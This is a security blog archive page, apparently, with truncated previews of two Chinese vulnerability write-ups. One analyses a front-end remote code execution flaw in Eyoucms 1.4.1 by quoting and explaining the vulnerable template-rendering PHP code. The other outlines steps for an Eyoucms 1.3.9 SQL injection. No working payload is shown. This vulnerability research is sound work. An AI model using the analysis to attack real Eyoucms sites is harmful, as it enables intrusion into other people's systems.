+        <h1 id="Eyoucms-1-4-1-前台rce"><a href="#Eyoucms-1-4-1-前台rce" class="headerlink" title="Eyoucms 1.4.1 前台rce"></a>Eyoucms 1.4.1 前台rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.4.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>进入<code>/application/api/controller/Ajax.php</code>中的**<code>function get_tag_memberlist</code>**方法</p>
+<pre><code>public function get_tag_memberlist()
+&#123;
+    if (IS_AJAX_POST) &#123;
+        $htmlcode = input(&#39;post.htmlcode/s&#39;);
+        $htmlcode = htmlspecialchars_decode($htmlcode);
+
+        $attarray = input(&#39;post.attarray/s&#39;);
+        $attarray = htmlspecialchars_decode($attarray);
+        $attarray = json_decode(base64_decode($attarray));
+
+        /*拼接完整的memberlist标签语法*/
+        $innertext = &quot;&#123;eyou:memberlist&quot;;
+        foreach ($attarray as $key =&gt; $val) &#123;
+            if (in_array($key, [&#39;js&#39;])) &#123;
+                continue;
+            &#125;
+            $innertext .= &quot; &#123;$key&#125;=&#39;&#123;$val&#125;&#39;&quot;;
+        &#125;
+        $innertext .= &quot; js=&#39;on&#39;&#125;&quot;;
+        $innertext .= $htmlcode;
+        $innertext .= &quot;&#123;/eyou:memberlist&#125;&quot;;
+        /*--end*/
+        $msg = $this-&gt;display($innertext); // 渲染模板标签语法
+        $data[&#39;msg&#39;] = $msg;
+        $this-&gt;success(&#39;读取成功！&#39;, null, $data);
+    &#125;
+    $this-&gt;error(&#39;加载失败！&#39;);
+&#125;
+</code></pre>
+<p>3 Line: 判断是否AJAX请求4 Line: 从post获取用户输入参数htmlcode的值并将结果赋值给$htmlcode5 Line: 将$htmlcode中的实体字符转换为正常字符7 Line: 从post获取用户输入参数attarray的值并将结果赋值给$attarray8 Line: 将$attarray中的实体字符转换为正常字符9 Line: 将$attarray进行base64解码再json解码12 Line: 定义标签13~18 Line:<br>使用foreach将$attay以键值对的方式遍历出来，判断每一个元素是否为js如果是那么直接进入下一次循环，否则”{$key}=’{$val}’”连接到标签后面19 Line: 闭合第一个标签20 Line: 将$htmlcode拼接到标签后，作为内容使用21 Line: 将闭合标签拼接到$innertext中23 Line: 调用基类中的display方法并将$innertext传入</p>
+<p>跟踪到<code>/core/library/think/Controll.php</code>文件中的**<code>display</code>**方法</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.4.1%20%E5%89%8D%E5%8F%B0rce/" data-id="cl5c2qoo5006ry8v1a9im4g0i" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Eyoucms/Eyoucms 1.3.9 前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.956Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-3-9-前台sql注入"><a href="#Eyoucms-1-3-9-前台sql注入" class="headerlink" title="Eyoucms 1.3.9 前台sql注入"></a>Eyoucms 1.3.9 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://0-sec.org:8081/eyoucms/?m=home&amp;c=View&amp;a=index&amp;aid=89
+</code></pre>
+<p><img src="/resource/Eyoucms1.3.9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId24.png"></p>
+<p>然后开启burp抓包，构建如下的包</p>
+<p>需要改两方面的参数一是referer，改成我们访问的页面</p>
+<p>然后将get的url构造为如下</p>
+<p><img src="/resource/Eyoucms1.3.9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qonx006jy8v1gdk3hnco" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/77/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/76/">76</a><a class="page-number" href="/page/77/">77</a><span class="page-number current">78</span><a class="page-number" href="/page/79/">79</a><a class="page-number" href="/page/80/">80</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/79/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
